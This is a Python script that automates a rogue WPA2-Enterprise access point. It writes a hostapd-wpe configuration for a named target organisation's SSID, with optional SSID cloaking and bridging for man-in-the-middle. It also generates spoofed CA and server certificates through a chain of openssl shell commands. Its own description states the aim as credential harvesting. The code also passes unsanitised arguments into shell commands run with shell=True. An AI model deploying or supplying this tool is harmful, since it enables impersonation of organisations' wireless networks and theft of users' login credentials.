#!/usr/bin/env python

import argparse
import datetime
import os
import subprocess
import tempfile
import time

import jinja2

jinja_env = jinja2.Environment(trim_blocks=True)
jinja_env.filters['strftime'] = lambda dt, fmt: dt.strftime(fmt)

# vars: broadcast, pwd, target, interface, ssid, channel, wpa_version, [bridge]
TEMPLATE_HOSTAPD_CONF = jinja_env.from_string("""\
# hostapd-wpe configuration file for {{ target }} created on {{ timestamp | strftime('%d %b %Y at %H:%M:%S') }}
interface={{ interface }}
ssid={{ ssid }}
channel={{ channel }}
{% if bridge %}bridge={{ bridge }}{% endif %}
ignore_broadcast_ssid={{ broadcast }}
eap_user_file={{ pwd }}/hostapd-wpe.eap_user
{# ca cert location #}
ca_cert={{ pwd }}/{{ target }}/ca.pem
{# server cert location #}
server_cert={{ pwd }}/{{ target }}/server.pem
{# private key location #}
private_key={{ pwd }}/{{ target }}/server.pem
private_key_passwd={{ password }}
dh_file={{ pwd }}/{{ target }}/dh
eap_fast_a_id=101112131415161718191a1b1c1d1e1f
eap_server=1
eap_fast_a_id_info=hostapd-wpe
eap_fast_prov=3
ieee8021x=1
pac_key_lifetime=604800
pac_key_refresh_time=86400
pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f
wpa={{ wpa_version }}
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
""")

TEMPLATE_OPENSSL_CONF = jinja_env.from_string("""\
[ ca ]
default_ca = CA_default
[ CA_default ]
dir = .
certs = $dir
crl_dir = $dir/crl
database = $dir/demoCA/index.txt
new_certs_dir = $dir
certificate = $dir/{{ cnf_type }}.pem
serial = $dir/demoCA/serial
crl = $dir/crl.pem
private_key = $dir/{{ cnf_type }}.key
RANDFILE = $dir/.rand
name_opt = ca_default
cert_opt = ca_default
default_days = 365
default_crl_days = 30
default_md = sha256
preserve = no
policy = policy_match
[ policy_match ]
countryName = optional
stateOrProvinceName = optional
organizationName = optional
organizationalUnitName = optional
commonName = supplied
emailAddress = optional
[ req ]
prompt = no
{% if cnf_type == 'ca' %}
distinguished_name = certificate_authority
{% elif cnf_type == 'server' %}
distinguished_name = server
{% endif %}
default_bits = 2048
input_password = {{ password }}
output_password = {{ password }}
[certificate_authority]
{% if country %}
countryName = {{ country }}
{% endif %}
{% if state %}
stateOrProvinceName = {{ state }}
{% endif %}
{% if location %}
localityName = {{ location }}
{% endif %}
{% if org %}
organizationName = {{ org }}
{% endif %}
{% if email %}
emailAddress = {{ email }}
{% endif %}
commonName = {{ common_name }}
""")

TEMPLATE_XPEXTENSIONS = """\
#
#  File containing the OID's required for Windows.
#
#  http://support.microsoft.com/kb/814394/en-us
#
[ xpclient_ext]
extendedKeyUsage = 1.3.6.1.5.5.7.3.2

[ xpserver_ext]
extendedKeyUsage = 1.3.6.1.5.5.7.3.1

#
#  Add this to the PKCS#7 keybag attributes holding the client's private key
#  for machine authentication.
#
#  the presence of this OID tells Windows XP that the cert is intended
#  for use by the computer itself, and not by an end-user.
#
#  The other solution is to use Microsoft's web certificate server
#  to generate these certs.
#
# 1.3.6.1.4.1.311.17.2
"""

def write_cnf(target, cnf_type, password, country, state, org, common_name, location, email):
	with open(os.path.join(target, cnf_type + '.cnf'), 'w') as cnf_file:
		cnf_file.write(TEMPLATE_OPENSSL_CONF.render(
			cnf_type=cnf_type,
			common_name=common_name,
			country=country,
			email=email,
			location=location,
			org=org,
			password=password,
			state=state
		))


def main():
	parser = argparse.ArgumentParser(description='Facilitate the creation of hostapd-wpe configuration files \
			and spoofed certificates for WPA2 Enterprise credential harvesting.')
	# hostapd-wpe configuration file parameters
	parser.add_argument('-t', '--target', dest='target', required=True, help='Name of target organization. Used to create directory. Required.')
	parser.add_argument('-s', '--ssid', dest='ssid', required=True, help='SSID of wireless network. Required.')
	parser.add_argument('-i', '--interface', dest='interface', required=True, help='Wireless interface on which to broadcast. Required.')
	parser.add_argument('-ch', '--channel', dest='channel', type=int, default=1, help='Channel on which to broadcast (default "1").')
	parser.add_argument('-bc', '--broadcast', dest='broadcast', type=int, default=0, choices=set((0, 1, 2)), help='Broadcast or cloak SSID. 0=Broadcast SSID; 1=Send empty SSID beacon (length=0); 2=Send SSID beacon with length (length=N) (default 0).')
	parser.add_argument('-br', '--bridge', dest='bridge', help='Bridge interface to use for MitM (default none).')
	parser.add_argument('-w', '--wpa', dest='wpa_version', type=int, default=2, choices=set((1,2)), help='Version of WPA (default "2")')
	# certificate generation parameters
	parser.add_argument('-cn', '--common-name', dest='common_name', required=True, help='Common name for certificate. Required.')
	parser.add_argument('-o', '--org', dest='org', help='Organization for certificate. Optional.')
	parser.add_argument('-st', '--state', dest='state', help='State or province for certificate. Optional.')
	parser.add_argument('-c', '--country', dest='country', help='Country code for certificate. Optional.')
	parser.add_argument('-p', '--password', dest='password', default='password', help='Password for certificate generation (default "password").')
	parser.add_argument('-l', '--location', dest='location', help='Location for certificate. Optional.')
	parser.add_argument('-ou', '--org-unit', dest='org_unit', help='Organizatoinal unit for certificate. Optional.')
	parser.add_argument('-e', '--email', dest='email', help='Email address for cerificate. Optional.')
	parser.add_argument('-v', '--verbose', action='store_true', help='Show verbose output.')

	# parse arguments
	args = parser.parse_args()
	target = args.target
	password = args.password

	# Setup the required directories
	if not os.path.isdir(os.path.join(target, 'demoCA', 'newcerts')):
		os.makedirs(os.path.join(target, 'demoCA', 'newcerts'))
	# Write the required index.txt and serial files
	with open(os.path.join(target, 'demoCA', 'index.txt'), 'w') as file_h:
		pass

	with open(os.path.join(target, 'demoCA', 'index.txt.attr'), 'w') as file_h:
		pass

	with open(os.path.join(target, 'demoCA', 'serial'), 'w') as file_h:
		file_h.write('01')

	write_cnf(target, 'ca', password, args.country, args.state, args.org, args.common_name, args.location, args.email)
	write_cnf(target, 'server', password, args.country, args.state, args.org, args.common_name, args.location, args.email)

	with open(os.path.join(target, target + '.conf'), 'w') as conf_file:
		conf_file.write(TEMPLATE_HOSTAPD_CONF.render(
			bridge=args.bridge,
			broadcast=args.broadcast,
			channel=args.channel,
			interface=args.interface,
			password=password,
			pwd=os.getcwd(),
			ssid=args.ssid,
			target=target,
			timestamp=datetime.datetime.utcnow(),
			wpa_version=args.wpa_version
		))

	# Build and execute the openssl commands for certificate generation
	subj = '/CN=' + args.common_name
	if args.country:
		subj += '/C=' + args.country
	if args.state:
		subj += '/ST=' + args.state
	if args.location:
		subj += '/L=' + args.location
	if args.org:
		subj += '/O=' + args.org
	if args.org_unit:
		subj += '/OU=' + args.org_unit
	if args.email:
		subj += '/emailAddress=' + args.email
	# write xpextensions out to a temp file
	_, xpextensions_path = tempfile.mkstemp(suffix='.txt')
	with open(xpextensions_path, 'w') as file_h:
		file_h.write(TEMPLATE_XPEXTENSIONS)
	if args.verbose:
		print('[*] Wrote xpextensions to tempfile: ' + xpextensions_path)
	commands = [
		'openssl dhparam -out ./{}/dh 1024'.format(target),
		'openssl req -new -sha256 -newkey rsa:2048 -passout pass:{} -subj \'{}\' -keyout ./{}/server.key -out ./{}/server.csr'.format(password, subj, target, target),
		'openssl req -new -x509 -keyout ./{}/ca.key -out ./{}/ca.pem -days 365 -config ./{}/ca.cnf '.format(target, target, target),
		'cd ./{}; openssl ca -batch -keyfile ca.key -cert ca.pem -in server.csr  -key {} -out server.crt -extensions xpserver_ext -extfile {} -config ./server.cnf; cd ../'.format(target, password, xpextensions_path),
		'openssl pkcs12 -export -in ./{}/server.crt -inkey ./{}/server.key -out ./{}/server.p12  -passin pass:{} -passout pass:{}'.format(target, target, target, password, password),
		'openssl pkcs12 -in ./{}/server.p12 -out ./{}/server.pem -passin pass:{} -passout pass:{}'.format(target, target, password, password),
		#'openssl verify -CAfile ./{}/ca.pem ./{}/server.pem'.format(target, target),  This line will always throw an error since we're generating self-signed certificates.
		'openssl x509 -inform PEM -outform DER -in ./{}/ca.pem -out ./{}/ca.der'.format(target, target)
	]
	for command in commands:
		if args.verbose:
			print('[*] Running command: ' + command)
		else:
			command += ' >/dev/null 2>&1'
		status = subprocess.call(command, shell=True)
		if status:
			print('[-] Command failed with status: ' + str(status))
			print('    ' + command)
			break
	else:
		print('[+] All commands completed successfully')
		print("[*] To run hostapd type: hostapd-wpe ./{0}/{0}.conf -s".format(target))
	os.unlink(xpextensions_path)

if __name__ == '__main__':
	main()
